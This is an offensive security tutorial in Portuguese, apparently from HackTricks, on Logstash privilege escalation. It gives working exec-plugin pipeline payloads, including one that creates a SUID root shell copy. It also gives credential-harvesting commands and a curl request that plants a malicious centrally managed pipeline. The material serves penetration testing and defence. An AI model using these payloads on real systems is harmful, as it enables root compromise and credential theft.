# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash é usado para **coletar, transformar e encaminhar logs** através de um sistema conhecido como **pipelines**. Esses pipelines são compostos por estágios **input**, **filter** e **output**. Um aspecto interessante surge quando o Logstash opera em uma máquina comprometida.

### Pipeline Configuration

Os pipelines são configurados no arquivo **/etc/logstash/pipelines.yml**, que lista os locais das configurações dos pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Este arquivo revela onde os arquivos **.conf**, contendo as configurações de pipeline, estão localizados. Ao empregar um **Elasticsearch output module**, é comum que as **pipelines** incluam **Elasticsearch credentials**, que frequentemente possuem privilégios extensos devido à necessidade do Logstash de gravar dados no Elasticsearch. Wildcards em caminhos de configuração permitem que o Logstash execute todas as pipelines correspondentes no diretório designado.

Se o Logstash for iniciado com `-f <directory>` em vez de `pipelines.yml`, **todos os arquivos dentro desse diretório são concatenados em ordem lexicográfica e analisados como uma única config**. Isso cria 2 implicações ofensivas:

- Um dropped file como `000-input.conf` ou `zzz-output.conf` pode alterar como a pipeline final é montada
- Um arquivo malformado pode impedir o carregamento de toda a pipeline, portanto valide cuidadosamente os payloads antes de depender do auto-reload

### Enumeração Rápida em um Host Comprometido

Em uma máquina onde o Logstash está instalado, inspecione rapidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Verifique também se a API de monitoramento local está acessível. Por padrão ela escuta em **127.0.0.1:9600**, o que geralmente é suficiente após obter acesso ao host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Isso normalmente fornece IDs de pipeline, detalhes de runtime e confirmação de que seu pipeline modificado foi carregado.

Credenciais recuperadas do Logstash costumam desbloquear o **Elasticsearch**, então verifique [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Para tentar privilege escalation, primeiro identifique o usuário sob o qual o serviço Logstash está sendo executado, tipicamente o usuário **logstash**. Certifique-se de que você atende **um** destes critérios:

- Possuir **acesso de escrita** a um arquivo de pipeline **.conf** **ou**
- O arquivo **/etc/logstash/pipelines.yml** usa um curinga, e você pode escrever na pasta alvo

Além disso, **uma** destas condições deve ser satisfeita:

- Capacidade de reiniciar o serviço Logstash **ou**
- O arquivo **/etc/logstash/logstash.yml** tem **config.reload.automatic: true** definido

Dado um curinga na configuração, criar um arquivo que corresponda a esse curinga permite a execução de comandos. Por exemplo:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Aqui, **interval** determina a frequência de execução em segundos. No exemplo dado, o comando **whoami** é executado a cada 120 segundos, com sua saída direcionada para **/tmp/output.log**.

Com **config.reload.automatic: true** em **/etc/logstash/logstash.yml**, o Logstash detectará e aplicará automaticamente novas configurações de pipeline ou modificações sem precisar de reinício. Se não houver um wildcard, ainda é possível fazer modificações nas configurações existentes, mas recomenda-se cautela para evitar interrupções.

### Payloads de Pipeline Mais Confiáveis

O input plugin `exec` ainda funciona nas versões atuais e requer ou um `interval` ou um `schedule`. Ele executa fazendo **forking** na JVM do Logstash, então se a memória estiver escassa seu payload pode falhar com `ENOMEM` em vez de rodar silenciosamente.

Um payload de privilege-escalation mais prático normalmente é aquele que deixa um artefato durável:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Se você não tem permissão para reiniciar, mas pode sinalizar o processo, o Logstash também suporta um recarregamento acionado por **SIGHUP** em sistemas do tipo Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Esteja ciente de que nem todo plugin suporta reload automático. Por exemplo, a entrada **stdin** impede o reload automático, então não presuma que `config.reload.automatic` sempre aplicará suas alterações.

### Roubando segredos do Logstash

Antes de focar apenas na execução de código, colete os dados aos quais o Logstash já tem acesso:

- Credenciais em plaintext frequentemente são codificadas dentro de outputs `elasticsearch {}`, `http_poller`, inputs JDBC, ou configurações relacionadas à cloud
- Configurações seguras podem residir em **`/etc/logstash/logstash.keystore`** ou em outro diretório `path.settings`
- A senha do keystore é frequentemente fornecida via **`LOGSTASH_KEYSTORE_PASS`**, e instalações via pacote costumam obtê-la de **`/etc/sysconfig/logstash`**
- A expansão de variáveis de ambiente com `${VAR}` é resolvida na inicialização do Logstash, então o ambiente do serviço vale a pena ser inspecionado

Verificações úteis:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Isso também vale a pena verificar porque **CVE-2023-46672** mostrou que o Logstash poderia registrar informações sensíveis em logs em circunstâncias específicas. Em um host de post-exploitation, logs antigos do Logstash e entradas do `journald` podem, portanto, divulgar credenciais mesmo se a configuração atual referenciar o keystore em vez de armazenar segredos inline.

### Abuso do gerenciamento centralizado de pipelines

Em alguns ambientes, o host não depende dos arquivos locais `.conf` de todo. Se `xpack.management.enabled: true` estiver configurado, o Logstash pode buscar pipelines gerenciadas centralmente do Elasticsearch/Kibana, e após habilitar esse modo as configurações de pipeline locais deixam de ser a fonte da verdade.

Isso significa um caminho de ataque diferente:

1. Recuperar credenciais do Elastic a partir das configurações locais do Logstash, do keystore ou dos logs
2. Verificar se a conta possui o privilégio de cluster `manage_logstash_pipelines`
3. Criar ou substituir uma pipeline gerenciada centralmente para que o host Logstash execute sua payload no próximo intervalo de polling

A API do Elasticsearch usada para esse recurso é:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Isso é especialmente útil quando arquivos locais são somente leitura, mas o Logstash já está registrado para buscar pipelines remotamente.

## Referências

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
